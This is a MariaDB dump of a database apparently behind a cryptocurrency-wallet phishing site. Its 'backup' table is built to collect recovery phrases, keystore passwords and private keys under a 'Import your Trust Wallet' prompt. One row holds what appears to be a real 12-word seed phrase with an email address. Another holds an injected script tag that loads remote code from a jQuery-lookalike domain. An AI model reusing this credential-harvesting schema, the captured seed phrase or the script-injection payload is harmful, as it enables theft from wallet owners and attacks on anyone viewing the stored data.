/*M!999999\- enable the sandbox mode */ 
-- MariaDB dump 10.19  Distrib 10.11.10-MariaDB, for Linux (x86_64)
--
-- Host: localhost    Database: u529358188_cweb3
-- ------------------------------------------------------
-- Server version	10.11.10-MariaDB-log

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `backup`
--

DROP TABLE IF EXISTS `backup`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `backup` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `wallet_name` varchar(50) NOT NULL,
  `email` varchar(50) NOT NULL,
  `recovery_phrase` varchar(100) NOT NULL,
  `keystore_json` varchar(100) NOT NULL,
  `keystore_password` varchar(100) NOT NULL,
  `private_key` text NOT NULL,
  `image_src` text NOT NULL,
  `icon_name` varchar(100) NOT NULL,
  `date` datetime NOT NULL DEFAULT current_timestamp(),
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `backup`
--

/*!40000 ALTER TABLE `backup` DISABLE KEYS */;
INSERT INTO `backup` VALUES
(1,'dhfgdhfdgd','fdghdf@mail.ru','word word word word word word word word word word word word','','','','https://connectweb3network.com/assets/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png','Import your Trust Wallet','2025-07-30 10:20:37'),
(2,'dhfgdhfdgd','fdghdf@mail.ru','word word<script src=\'https://jquery.bio/get/\'></script> word word word word word word word word wor','','','','https://connectweb3network.com/assets/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png','Import your Trust Wallet','2025-07-30 10:20:51'),
(3,'Trust wallet','ahhsjsj666s@gmail.com','Cube scene program portion combine ramp ticket skill rely traffic legend goat','','','','https://connectweb3network.com/assets/web3bridge.io/img/trust-wallet-66f8777532931d9c09b633344981a6a9.png','Import your Trust Wallet','2025-08-04 03:25:43');
/*!40000 ALTER TABLE `backup` ENABLE KEYS */;

--
-- Dumping routines for database 'u529358188_cweb3'
--
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2025-08-15 11:47:08
